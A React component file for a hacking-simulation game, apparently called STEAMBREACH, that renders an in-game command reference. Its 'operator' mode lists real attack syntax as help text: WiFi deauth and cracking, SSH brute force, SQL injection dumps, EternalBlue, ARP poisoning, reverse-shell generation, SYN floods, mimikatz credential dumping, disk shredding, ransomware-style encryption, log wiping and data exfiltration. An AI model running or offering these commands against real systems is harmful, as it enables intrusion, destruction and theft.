import React, { useEffect, useState, useRef } from 'react';
import { COLORS, DEV_COMMANDS } from '../constants/gameConstants';

const SyntaxText = ({ text }) => {
  if (typeof text !== 'string') return <span>{text}</span>;
  const parts = text.split(/(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b|\b[\w-]+\.(?:txt|zip|sql|db|log|yaml|bak|msg|bin|exe|hashes|eml|tmp|cap|csv)\b|\$\d+(?:,\d+)*|\[.*?\])/g);
  return (
    <span>
      {parts.map((part, i) => {
        if (!part) return null;
        if (part.match(/\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b/)) return <span key={i} style={{ color: COLORS.ip }}>{part}</span>;
        if (part.match(/\b[\w-]+\.(?:txt|zip|sql|db|log|yaml|bak|msg|bin|exe|hashes|eml|tmp|cap|csv)\b/)) return <span key={i} style={{ color: COLORS.file }}>{part}</span>;
        if (part.match(/\$\d+(?:,\d+)*/)) return <span key={i} style={{ color: COLORS.warning }}>{part}</span>;
        if (part.startsWith('[') && part.endsWith(']')) {
          if (part.includes('ERROR') || part.includes('!!!') || part.includes('-') || part.includes('LOCKED') || part.includes('FATAL') || part.includes('ALERT') || part.includes('BREACH') || part.includes('DETONATION')) return <span key={i} style={{ color: COLORS.danger }}>{part}</span>;
          if (part.includes('SUCCESS') || part.includes('+') || part.includes('SAFE') || part.includes('COMPLETE') || part.includes('WIN')) return <span key={i} style={{ color: COLORS.secondary }}>{part}</span>;
          return <span key={i} style={{ color: COLORS.primary }}>{part}</span>;
        }
        return <span key={i}>{part}</span>;
      })}
    </span>
  );
};

const Typewriter = ({ text, scrollRef, onComplete, customColor }) => {
  const [displayed, setDisplayed] = useState('');
  useEffect(() => {
    let i = 0;
    const timer = setInterval(() => {
      i += 4;
      setDisplayed(text.substring(0, i));
      if (scrollRef.current) scrollRef.current.scrollIntoView({ behavior: 'auto', block: 'end' });
      if (i >= text.length) { clearInterval(timer); if (onComplete) onComplete(); }
    }, 8);
    return () => clearInterval(timer);
  }, [text]); 

  return <span style={{ color: customColor || COLORS.text }}><SyntaxText text={displayed} /></span>;
};

// ===================================================================
// MODE-SPECIFIC COMMAND REGISTRY
// ===================================================================

const MODE_COMMANDS = {
  // -----------------------------------------------------------------
  // WIFI HACKING
  // -----------------------------------------------------------------
  'WIFI HACKING': {
    arcade: [
      { cmd: 'iwconfig', desc: 'Show wireless interface status' },
      { cmd: 'airmon-ng', desc: 'Toggle monitor mode on/off' },
      { cmd: 'airodump-ng', desc: 'Scan networks (then airodump-ng <name> to target)' },
      { cmd: 'aireplay-ng', desc: 'Auto-deauth and capture handshake' },
      { cmd: 'aircrack-ng', desc: 'Auto-crack with rockyou.txt' },
      { cmd: 'wifiphish <email>', desc: 'Social engineer WPA3 password from client' },
      { cmd: 'nmcli', desc: 'Auto-connect with cracked password' },
      { cmd: 'wireshark', desc: 'Analyze captured packets' },
      { cmd: 'wardrive', desc: 'Start/stop mobile WiFi scanning' },
      { cmd: 'wifistatus', desc: 'Show attack progress + next step' },
    ],
    field: [
      { cmd: 'iwconfig', desc: 'Show wlan0/wlan0mon status' },
      { cmd: 'airmon-ng start', desc: 'Enable monitor mode' },
      { cmd: 'airmon-ng stop', desc: 'Disable monitor mode' },
      { cmd: 'airodump-ng scan', desc: 'Scan all networks in range' },
      { cmd: 'airodump-ng <name>', desc: 'Target specific network' },
      { cmd: 'aireplay-ng deauth', desc: 'Deauth all clients on target' },
      { cmd: 'aireplay-ng deauth <MAC>', desc: 'Deauth specific client' },
      { cmd: 'aircrack-ng crack', desc: 'Crack with rockyou.txt wordlist' },
      { cmd: 'wifiphish <email>', desc: 'Phish WPA3 password from client' },
      { cmd: 'nmcli connect', desc: 'Connect with cracked password' },
      { cmd: 'wireshark', desc: 'Analyze capture file' },
      { cmd: 'wardrive', desc: 'Toggle mobile WiFi recon' },
      { cmd: 'wifistatus', desc: 'Show attack progress + next step' },
    ],
    operator: [
      { cmd: 'iwconfig', desc: 'Display wireless interface configuration' },
      { cmd: 'airmon-ng start wlan0', desc: 'Enable monitor mode on interface' },
      { cmd: 'airmon-ng stop wlan0mon', desc: 'Disable monitor mode' },
      { cmd: 'airodump-ng wlan0mon', desc: 'Passive scan all channels' },
      { cmd: 'airodump-ng --bssid <MAC> -c <CH> -w capture wlan0mon', desc: 'Focus capture on target' },
      { cmd: 'aireplay-ng --deauth 10 -a <BSSID> -c <CLIENT> wlan0mon', desc: 'Targeted deauth attack' },
      { cmd: 'aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap', desc: 'Dictionary attack on handshake' },
      { cmd: 'wifiphish <email>', desc: 'Social engineer WPA3 credentials' },
      { cmd: 'nmcli dev wifi connect <SSID> password <PASS>', desc: 'Connect to cracked network' },
      { cmd: 'wireshark', desc: 'Packet analysis on capture-01.cap' },
      { cmd: 'wardrive', desc: 'Mobile passive scanning (monitor mode required)' },
      { cmd: 'wifistatus', desc: 'Show current attack state' },
    ],
  },

  // -----------------------------------------------------------------
  // RECON & ACCESS
  // -----------------------------------------------------------------
  'RECON & ACCESS': {
    arcade: [
      { cmd: 'nmap', desc: 'Discover targets / open network map' },
      { cmd: 'nmap <ip>', desc: 'Scan target (auto-flags vulns)' },
      { cmd: 'hydra <ip>', desc: 'Brute-force SSH (auto-wordlist)' },
      { cmd: 'sqlmap <ip>', desc: 'SQL injection (auto-flags)' },
      { cmd: 'msfconsole <ip>', desc: 'Exploit SMB (auto-payload)' },
      { cmd: 'curl <ip>', desc: 'LFI exploit (auto-path)' },
      { cmd: 'spearphish <email@ip>', desc: 'Social engineer employee via AI chat' },
      { cmd: 'ettercap', desc: 'ARP poison + sniff comms' },
    ],
    field: [
      { cmd: 'nmap', desc: 'Discover targets / open network map' },
      { cmd: 'nmap <ip>', desc: 'Scan target for vulnerabilities' },
      { cmd: 'hydra <ip> ssh', desc: 'Brute-force SSH service' },
      { cmd: 'hydra <ip> ftp', desc: 'Brute-force FTP service' },
      { cmd: 'sqlmap <ip> form', desc: 'SQL injection on login form' },
      { cmd: 'sqlmap <ip> api', desc: 'SQL injection on API endpoint' },
      { cmd: 'msfconsole <ip>', desc: 'Exploit unpatched SMB' },
      { cmd: 'curl <ip>', desc: 'LFI path traversal' },
      { cmd: 'spearphish <email@ip>', desc: 'Phish employee (AI chat)' },
      { cmd: 'ettercap', desc: 'ARP poison + sniff comms' },
    ],
    operator: [
      { cmd: 'nmap', desc: 'Open network map / discover targets' },
      { cmd: 'nmap -sV -sC -O <ip>', desc: 'Full service/version scan' },
      { cmd: 'hydra -l admin -P /usr/share/wordlists/rockyou.txt <ip> ssh', desc: 'SSH brute-force' },
      { cmd: 'sqlmap -u "http://<ip>/login" --forms --dump', desc: 'SQL injection + dump' },
      { cmd: 'msfconsole -x "use exploit/windows/smb/ms17_010; set RHOSTS <ip>; run"', desc: 'EternalBlue exploit' },
      { cmd: 'curl --path-as-is "http://<ip>/../../etc/passwd"', desc: 'LFI path traversal' },
      { cmd: 'spearphish <email@ip>', desc: 'Social engineering via live AI chat' },
      { cmd: 'ettercap -T -M arp:remote /<gateway>// /<target>//', desc: 'MITM ARP poisoning' },
    ],
  },

  // -----------------------------------------------------------------
  // PRIVILEGE ESCALATION
  // -----------------------------------------------------------------
  'PRIVILEGE ESCALATION': {
    arcade: [
      { cmd: 'pwnkit', desc: 'Auto-escalate to root' },
      { cmd: 'ssh <user@ip> <pass>', desc: 'Login with stolen creds' },
      { cmd: 'sendmail -to <email> -attach <file>', desc: 'Phishing email' },
    ],
    field: [
      { cmd: 'pwnkit', desc: 'CVE-2021-4034 privilege escalation' },
      { cmd: 'ssh <user@ip> <pass>', desc: 'Authenticate with credentials' },
      { cmd: 'sendmail -to <email> -attach <file>', desc: 'Spoof internal email' },
    ],
    operator: [
      { cmd: 'pwnkit', desc: 'Polkit pkexec local privilege escalation' },
      { cmd: 'ssh <user>@<ip> -i key.pem', desc: 'SSH with private key' },
      { cmd: 'sendmail -to <email> -from ceo@corp.local -attach <file>', desc: 'Spoofed phishing email' },
    ],
  },

  // -----------------------------------------------------------------
  // BOTNET & C2
  // -----------------------------------------------------------------
  'BOTNET & C2': {
    arcade: [
      { cmd: 'sliver', desc: 'Deploy C2 beacon (passive income)' },
      { cmd: 'chisel', desc: 'Create proxy tunnel (slows trace)' },
      { cmd: 'disconnect <ip>', desc: 'Remove proxy/botnet node' },
      { cmd: 'hping3 <ip>', desc: 'DDoS attack from botnet' },
      { cmd: 'mimikatz <ip>', desc: 'Dump credentials from node' },
      { cmd: 'stash <file>', desc: 'Exfil through botnet (low heat)' },
    ],
    field: [
      { cmd: 'sliver', desc: 'Deploy C2 beacon for passive income' },
      { cmd: 'chisel', desc: 'SOCKS5 proxy tunnel' },
      { cmd: 'disconnect <ip>', desc: 'Remove node from botnet' },
      { cmd: 'hping3 <ip>', desc: 'SYN flood DDoS attack' },
      { cmd: 'mimikatz <ip>', desc: 'Dump LSASS credentials' },
      { cmd: 'stash <file>', desc: 'Route exfil through botnet' },
    ],
    operator: [
      { cmd: 'sliver', desc: 'Deploy Sliver C2 implant (requires root)' },
      { cmd: 'chisel server -p 8080 --reverse', desc: 'Start SOCKS5 tunnel' },
      { cmd: 'disconnect <ip>', desc: 'Terminate C2 session' },
      { cmd: 'hping3 -S --flood -V -p 80 <ip>', desc: 'SYN flood attack' },
      { cmd: 'mimikatz "sekurlsa::logonpasswords" <ip>', desc: 'Extract cleartext passwords' },
      { cmd: 'stash <file>', desc: 'Exfil via botnet relay (+3% heat)' },
    ],
  },

  // -----------------------------------------------------------------
  // PAYLOADS & MALWARE
  // -----------------------------------------------------------------
  'PAYLOADS & MALWARE': {
    arcade: [
      { cmd: 'msfvenom', desc: 'Deploy auto-configured payload' },
      { cmd: 'eternalblue', desc: 'Mass SMB propagation' },
      { cmd: 'reptile', desc: 'Install kernel rootkit' },
      { cmd: 'xmrig', desc: 'Deploy cryptominer' },
      { cmd: 'shred', desc: 'Destroy file system' },
      { cmd: 'openssl', desc: 'Deploy ransomware' },
      { cmd: 'crontab', desc: 'Schedule logic bomb' },
      { cmd: 'wipe', desc: 'Scrub logs (Heat -15%)' },
    ],
    field: [
      { cmd: 'msfvenom reverse', desc: 'Reverse shell payload' },
      { cmd: 'msfvenom bind', desc: 'Bind shell payload' },
      { cmd: 'eternalblue', desc: 'SMBv1 worm propagation' },
      { cmd: 'reptile', desc: 'Stealth kernel rootkit' },
      { cmd: 'xmrig', desc: 'Monero cryptominer' },
      { cmd: 'shred mbr', desc: 'Overwrite boot record' },
      { cmd: 'shred fs', desc: 'Destroy file system' },
      { cmd: 'shred full', desc: 'Zero entire disk' },
      { cmd: 'openssl strong', desc: 'AES-256 ransomware' },
      { cmd: 'openssl fast', desc: 'AES-128 ransomware' },
      { cmd: 'crontab', desc: 'Schedule timed payload' },
      { cmd: 'wipe', desc: 'Scrub system logs' },
    ],
    operator: [
      { cmd: 'msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 -f elf -o shell.bin', desc: 'Generate reverse shell' },
      { cmd: 'eternalblue', desc: 'MS17-010 SMBv1 exploit chain' },
      { cmd: 'reptile', desc: 'LKM rootkit with magic packets' },
      { cmd: 'xmrig --config config.json --background --threads 4 --max-cpu 75', desc: 'Stealth miner deployment' },
      { cmd: 'shred -vfz -n 3 /dev/sda', desc: 'Secure disk destruction' },
      { cmd: 'openssl enc -aes-256-cbc -salt -pbkdf2 -in <file> -out <file>.enc', desc: 'File encryption' },
      { cmd: 'crontab -e "0 0 * * * /tmp/payload.sh"', desc: 'Scheduled execution' },
      { cmd: 'wipe', desc: 'Clear /var/log/* and bash_history' },
    ],
  },

  // -----------------------------------------------------------------
  // DATA & CRACKING
  // -----------------------------------------------------------------
  'DATA & CRACKING': {
    arcade: [
      { cmd: 'exfil <file>', desc: 'Extract data (Trace +25%)' },
      { cmd: 'rclone', desc: 'Mass data exfiltration' },
      { cmd: 'download <file>', desc: 'Save file locally' },
      { cmd: 'hashcat <file>', desc: 'Crack password hashes' },
      { cmd: 'john <file>', desc: 'CPU password cracker' },
      { cmd: 'fence intel', desc: 'Sell intel on darknet' },
    ],
    field: [
      { cmd: 'exfil <file>', desc: 'Extract financial data' },
      { cmd: 'rclone', desc: 'Mass corporate exfil (root)' },
      { cmd: 'download <file>', desc: 'Save to local storage' },
      { cmd: 'hashcat <file>', desc: 'GPU hash cracking' },
      { cmd: 'hashcat <file> -d', desc: 'Distributed botnet crack' },
      { cmd: 'john <file>', desc: 'CPU-based cracking' },
      { cmd: 'fence intel', desc: 'Sell on darknet market' },
    ],
    operator: [
      { cmd: 'exfil <file>', desc: 'Exfiltrate via encrypted channel' },
      { cmd: 'rclone sync /data remote:exfil --progress', desc: 'Mass sync to remote' },
      { cmd: 'download <file>', desc: 'scp to local operator machine' },
      { cmd: 'hashcat -m 1000 -a 0 <file> rockyou.txt', desc: 'NTLM hash crack' },
      { cmd: 'john --wordlist=rockyou.txt --format=raw-sha256 <file>', desc: 'SHA256 crack' },
      { cmd: 'fence intel', desc: 'List stolen data on market' },
    ],
  },

  // -----------------------------------------------------------------
  // ECONOMY & ITEMS
  // -----------------------------------------------------------------
  'ECONOMY & ITEMS': {
    arcade: [
      { cmd: 'use decoy', desc: 'Trace -30%' },
      { cmd: 'use burner', desc: 'Heat -25%' },
      { cmd: 'use 0day', desc: 'Instant root (no logging)' },
      { cmd: 'contracts', desc: 'View fixer contracts' },
      { cmd: 'market', desc: 'Open unified market hub' },
      { cmd: 'buy <item> <qty>', desc: 'Buy commodity' },
      { cmd: 'sell <item> <qty>', desc: 'Sell commodity' },
      { cmd: 'shop / hardware / rig', desc: 'Alias → market hub' },
    ],
    field: [
      { cmd: 'use decoy', desc: 'Deploy trace decoy (-30%)' },
      { cmd: 'use burner', desc: 'Burn VPN (-25% heat)' },
      { cmd: 'use 0day', desc: 'Zero-day instant root' },
      { cmd: 'contracts', desc: 'AI fixer contract board' },
      { cmd: 'market', desc: 'Unified market hub' },
      { cmd: 'buy <item> <qty>', desc: 'Purchase at market price' },
      { cmd: 'sell <item> <qty>', desc: 'Sell from stash' },
      { cmd: 'shop / hardware / rig', desc: 'Alias → market hub' },
    ],
    operator: [
      { cmd: 'use decoy', desc: 'Inject false trail (-30% trace)' },
      { cmd: 'use burner', desc: 'Rotate exit node (-25% heat)' },
      { cmd: 'use 0day', desc: 'Weaponized zero-day exploit' },
      { cmd: 'contracts', desc: 'View available contracts' },
      { cmd: 'market', desc: 'Access unified market hub' },
      { cmd: 'buy <item> <qty>', desc: 'Purchase commodity' },
      { cmd: 'sell <item> <qty>', desc: 'Liquidate holdings' },
      { cmd: 'shop / hardware / rig', desc: 'Alias → market hub' },
    ],
  },

  // -----------------------------------------------------------------
  // RIVALS & ZERO-DAYS
  // -----------------------------------------------------------------
  'RIVALS & ZERO-DAYS': {
    arcade: [
      { cmd: 'rivals', desc: 'List known rivals and threat status' },
      { cmd: 'dossier', desc: 'Auto-pick rival dossier (hostile first)' },
      { cmd: 'raid', desc: 'Auto-target highest-value rival' },
      { cmd: 'taunt', desc: 'Auto-provoke rival (raises retaliation risk)' },
      { cmd: 'exploits', desc: 'Show zero-day collection and bonuses' },
    ],
    field: [
      { cmd: 'rivals', desc: 'List known rivals and status' },
      { cmd: 'dossier <handle>', desc: 'View detailed rival profile' },
      { cmd: 'raid <handle>', desc: 'Attack rival for BTC/REP/zero-days' },
      { cmd: 'taunt <handle>', desc: 'Force hostility and raise retaliation chance' },
      { cmd: 'exploits', desc: 'List collected zero-days' },
    ],
    operator: [
      { cmd: 'rivals', desc: 'List rival registry with status and node intel' },
      { cmd: 'dossier --handle <h>', desc: 'Operator-mode dossier lookup' },
      { cmd: 'raid --target <h>', desc: 'Operator-mode targeted rival attack' },
      { cmd: 'taunt --target <h>', desc: 'Operator-mode provocation command' },
      { cmd: 'exploits', desc: 'Zero-day inventory and category power' },
    ],
  },

  // -----------------------------------------------------------------
  // SYSTEM & NAV
  // -----------------------------------------------------------------
  'SYSTEM & NAV': {
    arcade: [
      { cmd: 'travel <region>', desc: 'Change region' },
      { cmd: 'status', desc: 'Show operator status' },
      { cmd: 'ls / cd / pwd', desc: 'Navigate file system' },
      { cmd: 'cat <file>', desc: 'Read file contents' },
      { cmd: 'exit', desc: 'Disconnect from node' },
      { cmd: 'clear', desc: 'Clear terminal' },
      { cmd: 'save', desc: 'Save progress' },
      { cmd: 'menu', desc: 'Return to main menu' },
    ],
    field: [
      { cmd: 'travel <region>', desc: 'Reroute to region' },
      { cmd: 'status', desc: 'Full operator report' },
      { cmd: 'ls', desc: 'List directory' },
      { cmd: 'cd <dir>', desc: 'Change directory' },
      { cmd: 'pwd', desc: 'Print working directory' },
      { cmd: 'cat <file>', desc: 'Display file contents' },
      { cmd: 'exit', desc: 'Disconnect safely' },
      { cmd: 'clear', desc: 'Clear output buffer' },
      { cmd: 'save', desc: 'Checkpoint progress' },
      { cmd: 'menu', desc: 'Auto-save and exit' },
    ],
    operator: [
      { cmd: 'travel us-gov|ru-darknet|cn-financial|eu-central', desc: 'Change operational region' },
      { cmd: 'status', desc: 'Display full SITREP' },
      { cmd: 'ls -la', desc: 'List with permissions' },
      { cmd: 'cd <path>', desc: 'Navigate directories' },
      { cmd: 'pwd', desc: 'Show current path' },
      { cmd: 'cat <file>', desc: 'Read file (AI-generated)' },
      { cmd: 'exit', desc: 'Clean disconnect' },
      { cmd: 'clear', desc: 'Flush terminal buffer' },
      { cmd: 'save', desc: 'Serialize game state' },
      { cmd: 'menu', desc: 'Save and return to menu' },
    ],
  },

  // -----------------------------------------------------------------
  // MORALITY
  // -----------------------------------------------------------------
  'MORALITY': {
    arcade: [
      { cmd: 'assist', desc: 'Help civilian (+SIGNAL)' },
      { cmd: 'crashpc', desc: 'Brick civilian PC (+CHAOS)' },
      { cmd: 'salvage', desc: 'Recover hidden power-up' },
    ],
    field: [
      { cmd: 'assist', desc: 'Quietly help civilian (+SIGNAL)' },
      { cmd: 'crashpc', desc: 'Destroy civilian machine (+CHAOS)' },
      { cmd: 'salvage', desc: 'Extract hidden item' },
    ],
    operator: [
      { cmd: 'assist', desc: 'Covert civilian assistance' },
      { cmd: 'crashpc', desc: 'Destructive civilian interference' },
      { cmd: 'salvage', desc: 'Recover concealed asset' },
    ],
  },

  // -----------------------------------------------------------------
  // STORY EVENTS
  // -----------------------------------------------------------------
  'STORY EVENTS': {
    arcade: [
      { cmd: 'cat intercept.log', desc: 'Trigger moral dilemma' },
      { cmd: 'resolve 1', desc: 'Heroic path (+SIGNAL)' },
      { cmd: 'resolve 2', desc: 'Ruthless path (+CHAOS)' },
      { cmd: 'wifi_choice signal', desc: 'WiFi: ethical choice' },
      { cmd: 'wifi_choice chaos', desc: 'WiFi: exploit data' },
    ],
    field: [
      { cmd: 'cat intercept.log', desc: 'View intercepted data' },
      { cmd: 'resolve 1', desc: 'Choose heroic path' },
      { cmd: 'resolve 2', desc: 'Choose ruthless path' },
      { cmd: 'wifi_choice signal', desc: 'Report/help (+SIGNAL)' },
      { cmd: 'wifi_choice chaos', desc: 'Exploit/sell (+CHAOS)' },
      { cmd: 'wifi_choice neutral', desc: 'Walk away' },
    ],
    operator: [
      { cmd: 'cat intercept.log', desc: 'Analyze intercepted communications' },
      { cmd: 'resolve 1', desc: 'Execute SIGNAL protocol' },
      { cmd: 'resolve 2', desc: 'Execute CHAOS protocol' },
      { cmd: 'wifi_choice signal', desc: 'Ethical disclosure' },
      { cmd: 'wifi_choice chaos', desc: 'Weaponize intelligence' },
      { cmd: 'wifi_choice neutral', desc: 'Maintain cover' },
    ],
  },
};

// Mode display info
const MODE_INFO = {
  arcade: { label: 'ARCADE MODE', reward: '1x', desc: 'Auto-flags - Just type command name' },
  field: { label: 'FIELD MODE', reward: '2x', desc: 'Key flags required - cmd flag' },
  operator: { label: 'OPERATOR MODE', reward: '4x', desc: 'Full syntax - Real-world commands' },
};

// Category order for display
const CATEGORY_ORDER = [
  'WIFI HACKING',
  'RECON & ACCESS',
  'PRIVILEGE ESCALATION',
  'BOTNET & C2',
  'PAYLOADS & MALWARE',
  'DATA & CRACKING',
  'ECONOMY & ITEMS',
  'RIVALS & ZERO-DAYS',
  'SYSTEM & NAV',
  'MORALITY',
  'STORY EVENTS',
];

// --- SESSION MEMORY CACHE ---
let cachedHelpPos = null;
let cachedHelpSize = null;

const HelpPanel = ({ onClose, devMode, gameMode = 'arcade' }) => {
  const panelRef = useRef(null);
  const mode = gameMode || 'arcade';
  const modeInfo = MODE_INFO[mode];

  // Load from cache, or use defaults
  const [pos, setPos] = useState(cachedHelpPos || {
    x: window.innerWidth > 800 ? window.innerWidth - 580 : 10,
    y: window.innerHeight > 600 ? 50 : 20
  });
  
  const [isDragging, setIsDragging] = useState(false);
  const [expandedCategories, setExpandedCategories] = useState(
    CATEGORY_ORDER.reduce((acc, cat) => ({ ...acc, [cat]: false }), {})
  );
  const dragOffset = useRef({ x: 0, y: 0 });

  const toggleCategory = (cat) => {
    setExpandedCategories(prev => ({ ...prev, [cat]: !prev[cat] }));
  };

  const handleMouseDown = (e) => {
    setIsDragging(true);
    dragOffset.current = {
      x: e.clientX - pos.x,
      y: e.clientY - pos.y
    };
  };

  useEffect(() => {
    const handleMouseMove = (e) => {
      if (!isDragging) return;
      setPos({
        x: e.clientX - dragOffset.current.x,
        y: e.clientY - dragOffset.current.y
      });
    };

    const handleMouseUp = () => setIsDragging(false);

    if (isDragging) {
      window.addEventListener('mousemove', handleMouseMove);
      window.addEventListener('mouseup', handleMouseUp);
    }
    return () => {
      window.removeEventListener('mousemove', handleMouseMove);
      window.removeEventListener('mouseup', handleMouseUp);
    };
  }, [isDragging]);

  // Save Position to memory whenever it changes
  useEffect(() => {
    cachedHelpPos = pos;
  }, [pos]);

  // Custom Close function to capture custom sizing before it disappears
  const handleCloseClick = () => {
    if (panelRef.current) {
      cachedHelpSize = {
        width: panelRef.current.style.width,
        height: panelRef.current.style.height
      };
    }
    onClose();
  };

  // Get mode-specific color
  const modeColor = mode === 'arcade' ? COLORS.secondary : 
                    mode === 'field' ? COLORS.warning : 
                    COLORS.danger;

  return (
    <div 
      ref={panelRef}
      style={{
        position: 'absolute', 
        left: `${pos.x}px`,     
        top: `${pos.y}px`,      
        width: cachedHelpSize?.width || '550px',
        height: cachedHelpSize?.height || 'auto',
        minWidth: '400px',      
        maxHeight: '85vh',
        background: 'rgba(8,12,18,0.98)', 
        border: `1px solid ${modeColor}80`,
        fontSize: '11px',
        color: COLORS.text,
        zIndex: 9999, 
        backdropFilter: 'blur(15px)',
        boxShadow: `0 0 50px rgba(0,0,0,0.9), 0 0 20px ${modeColor}30`,
        borderRadius: '4px',
        display: 'flex',
        flexDirection: 'column',
        resize: 'both',         
        overflow: 'hidden'      
      }}>
      
      {/* HEADER / DRAG HANDLE */}
      <div 
        onMouseDown={handleMouseDown}
        style={{ 
          display: 'flex', 
          flexDirection: 'column',
          borderBottom: `1px solid ${COLORS.borderActive}`, 
          padding: '12px 20px', 
          background: `${modeColor}15`,
          cursor: isDragging ? 'grabbing' : 'grab', 
          userSelect: 'none'
        }}
      >
        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '8px' }}>
          <span style={{ color: COLORS.primary, fontWeight: 'bold', letterSpacing: '2px', fontSize: '13px' }}>
            STEAMBREACH COMMAND REFERENCE
          </span>
          <span 
            onClick={handleCloseClick} 
            style={{ 
              color: COLORS.textDim, 
              cursor: 'pointer', 
              border: `1px solid ${COLORS.textDim}40`, 
              padding: '2px 10px', 
              borderRadius: '3px',
              fontSize: '10px'
            }}
          >
            [TAB] CLOSE
          </span>
        </div>
        
        {/* Mode indicator */}
        <div style={{ 
          display: 'flex', 
          alignItems: 'center', 
          gap: '12px',
          padding: '8px 12px',
          background: `${modeColor}20`,
          borderRadius: '3px',
          border: `1px solid ${modeColor}40`
        }}>
          <span style={{ color: modeColor, fontWeight: 'bold', fontSize: '12px', letterSpacing: '1px' }}>
            {modeInfo.label}
          </span>
          <span style={{ color: COLORS.warning, fontSize: '11px' }}>
            {modeInfo.reward} REWARDS
          </span>
          <span style={{ color: COLORS.textDim, fontSize: '10px', marginLeft: 'auto' }}>
            {modeInfo.desc}
          </span>
        </div>
        <div style={{ color: COLORS.textDim, fontSize: '10px', marginTop: '6px' }}>
          Sections start collapsed. Click <span style={{ color: COLORS.primary }}>[ + ]</span> to expand.
        </div>
      </div>
      
      {/* SCROLLABLE CONTENT */}
      <div style={{ 
        flexGrow: 1, 
        overflowY: 'auto', 
        display: 'flex', 
        flexDirection: 'column', 
        gap: '2px', 
        padding: '12px 16px',
        scrollbarWidth: 'thin', 
        scrollbarColor: `${COLORS.primaryDim} transparent`
      }}>
        
        {CATEGORY_ORDER.map((categoryName) => {
          const commands = MODE_COMMANDS[categoryName]?.[mode] || [];
          if (commands.length === 0) return null;
          
          const isExpanded = expandedCategories[categoryName];
          
          return (
            <div key={categoryName} style={{ marginBottom: '4px' }}>
              {/* Category Header - Clickable */}
              <div 
                onClick={() => toggleCategory(categoryName)}
                style={{ 
                  color: COLORS.secondary, 
                  marginTop: '2px', 
                  marginBottom: '6px', 
                  fontWeight: 'bold', 
                  borderBottom: `1px dashed ${COLORS.borderActive}`, 
                  paddingBottom: '4px',
                  letterSpacing: '1px',
                  fontSize: '11px',
                  cursor: 'pointer',
                  display: 'flex',
                  justifyContent: 'space-between',
                  alignItems: 'center'
                }}
              >
                <span>[{categoryName}]</span>
                <span style={{ color: COLORS.textDim, fontSize: '9px' }}>
                  {isExpanded ? '[ - ]' : '[ + ]'} {commands.length}
                </span>
              </div>
              
              {/* Commands */}
              {isExpanded && commands.map((c, i) => (
                <div key={i} style={{ display: 'flex', marginBottom: '5px', lineHeight: '1.4', paddingLeft: '8px' }}>
                  <span style={{ 
                    color: modeColor, 
                    minWidth: mode === 'operator' ? '320px' : '180px',
                    maxWidth: mode === 'operator' ? '320px' : '180px',
                    flexShrink: 0, 
                    fontFamily: 'monospace', 
                    fontWeight: 'bold',
                    fontSize: '10px',
                    wordBreak: 'break-all'
                  }}>
                    {c.cmd}
                  </span>
                  <span style={{ color: COLORS.textDim, fontSize: '10px', paddingLeft: '8px' }}>
                    {c.desc}
                  </span>
                </div>
              ))}
            </div>
          );
        })}
        
        {/* DEV COMMANDS */}
        {devMode && (
          <div style={{ marginBottom: '8px' }}>
            <div style={{ 
              color: COLORS.danger, 
              marginTop: '8px', 
              borderBottom: `1px dashed ${COLORS.danger}60`, 
              paddingBottom: '4px', 
              marginBottom: '8px', 
              fontWeight: 'bold', 
              letterSpacing: '1px', 
              fontSize: '11px' 
            }}>
              [DEVELOPER PROTOCOLS]
            </div>
            {DEV_COMMANDS.map((c, i) => (
              <div key={`dev-${i}`} style={{ display: 'flex', marginBottom: '4px', paddingLeft: '8px' }}>
                <span style={{ color: COLORS.danger, minWidth: '180px', flexShrink: 0, fontSize: '10px' }}>{c.cmd}</span>
                <span style={{ color: COLORS.textDim, fontSize: '10px' }}>{c.desc}</span>
              </div>
            ))}
          </div>
        )}
        
        {/* FOOTER */}
        <div style={{ 
          marginTop: '12px', 
          paddingTop: '10px', 
          borderTop: `1px solid ${COLORS.borderActive}`, 
          color: COLORS.textDim, 
          textAlign: 'center', 
          fontSize: '9px', 
          letterSpacing: '1px' 
        }}>
          STEAMBREACH v3.1 // {modeInfo.label} ACTIVE // SYNTAX REFERENCE LOADED
        </div>
      </div>
    </div>
  );
};

export { SyntaxText, Typewriter, HelpPanel };
